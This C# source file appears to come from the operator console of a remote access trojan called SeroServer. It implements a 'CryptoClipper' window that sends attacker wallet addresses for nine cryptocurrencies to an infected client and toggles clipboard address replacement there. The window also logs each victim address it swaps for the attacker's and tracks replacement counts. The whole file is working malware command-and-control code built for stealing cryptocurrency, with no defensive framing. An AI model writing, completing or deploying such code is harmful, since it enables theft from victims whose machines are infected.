using System.Windows;
using System.Windows.Input;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class CryptoClipperWindow : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private int                _totalCount;

    public CryptoClipperWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;

        _server.RegisterHandler(clientId, PacketType.ClipperStatsResult, OnStatsResult);
        _server.RegisterHandler(clientId, PacketType.ClipperDetected,    OnDetected);

        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.ClipperStatsResult);
            _server.UnregisterHandler(clientId, PacketType.ClipperDetected);
        };

        // Request current stats on open (staggered)
        Loaded += async (_, _) =>
        {
            await Task.Delay(Random.Shared.Next(0, 250));
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.ClipperGetStats });
        };
    }

    // ── Incoming ────────────────────────────────────────────────────────────

    private void OnStatsResult(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<ClipperStatsResultData>(pkt.Data);
        if (data == null) return;
        Dispatcher.BeginInvoke(() =>
        {
            ChkEnabled.IsChecked = data.Enabled;
            BadgeActive.Visibility = data.Enabled ? Visibility.Visible : Visibility.Collapsed;
            _totalCount = data.Count;
            TxtCount.Text = $"{_totalCount} replacement{(_totalCount != 1 ? "s" : "")}";
            TxtStatus.Text = data.Enabled ? "Clipper is active" : "Clipper is disabled";
        });
    }

    private void OnDetected(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<ClipperDetectedData>(pkt.Data);
        if (data == null) return;
        Dispatcher.BeginInvoke(() =>
        {
            _totalCount++;
            TxtCount.Text = $"{_totalCount} replacement{(_totalCount != 1 ? "s" : "")}";
            var line = $"[{DateTime.Now:h:mm tt}]  {data.Type}  {data.Original[..Math.Min(data.Original.Length, 20)]}…  →  {data.Replaced}\n";
            TxtLog.AppendText(line);
            LogScroll.ScrollToEnd();

            TxtStatus.Text = $"Replaced {data.Type} address ({_totalCount} total)";
        });
    }

    // ── Apply config ────────────────────────────────────────────────────────

    private async void BtnApply_Click(object s, RoutedEventArgs e)
    {
        var cfg = new ClipperSetConfigData
        {
            Enabled   = ChkEnabled.IsChecked == true,
            Addresses = new ClipperAddresses
            {
                BTC  = AddrBTC.Text.Trim(),
                ETH  = AddrETH.Text.Trim(),
                LTC  = AddrLTC.Text.Trim(),
                TRX  = AddrTRX.Text.Trim(),
                SOL  = AddrSOL.Text.Trim(),
                XMR  = AddrXMR.Text.Trim(),
                XRP  = AddrXRP.Text.Trim(),
                DASH = AddrDASH.Text.Trim(),
                BCH  = AddrBCH.Text.Trim(),
            }
        };

        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.ClipperSetConfig,
            Data = JsonConvert.SerializeObject(cfg)
        });

        BadgeActive.Visibility = cfg.Enabled ? Visibility.Visible : Visibility.Collapsed;
        TxtStatus.Text = cfg.Enabled ? "Clipper activated" : "Clipper disabled";
        var status = cfg.Enabled ? "activated" : "disabled";
        ServerWindow.ReportGlobalActivity("Configure Clipper", status, "complete");
        ServerWindow.LogGlobal($"[CLIPPER] Clipper {status} for client {_clientId}.");
    }

    private void ChkEnabled_Changed(object s, RoutedEventArgs e)
    {
        BadgeActive.Visibility = (ChkEnabled.IsChecked == true) ? Visibility.Visible : Visibility.Collapsed;
    }

    private async void BtnStats_Click(object s, RoutedEventArgs e)
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.ClipperGetStats });
        TxtStatus.Text = "Refreshing stats…";
    }

    private void BtnClearLog_Click(object s, RoutedEventArgs e)
    {
        TxtLog.Clear();
        _totalCount = 0;
        TxtCount.Text = "0 replacements";
    }

    private bool _maximized;
    private void BtnMax_Click(object s, RoutedEventArgs e)
    {
        _maximized = !_maximized;
        WindowState = _maximized ? WindowState.Maximized : WindowState.Normal;
        RootBorder.CornerRadius = _maximized ? new CornerRadius(0) : new CornerRadius(8);
        BtnMax.Content = _maximized ? "❐" : "☐";
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized)
            DragMove();
    }

    private void ResizeGrip_DragDelta(object s, System.Windows.Controls.Primitives.DragDeltaEventArgs e)
    {
        Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
        Height = Math.Max(MinHeight, Height + e.VerticalChange);
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}
